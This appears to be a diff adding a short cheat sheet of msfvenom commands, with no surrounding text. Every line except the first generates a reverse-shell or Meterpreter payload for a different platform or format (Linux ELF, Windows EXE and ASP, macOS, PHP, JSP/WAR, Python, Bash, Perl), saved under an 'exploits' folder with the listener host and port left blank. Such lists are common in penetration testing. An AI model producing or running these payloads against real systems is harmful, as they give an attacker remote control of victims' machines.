@@ -1,0 +1,11 @@
+msfvenom –help-formats
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > /root/Downloads/exploits/exploit.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > /root/Downloads/exploits/exploit.exe
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > /root/Downloads/exploits/exploit.macho
+msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > /root/Downloads/exploits/exploit.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > /root/Downloads/exploits/exploit.war
+msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.py
+msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.sh
+msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.pl
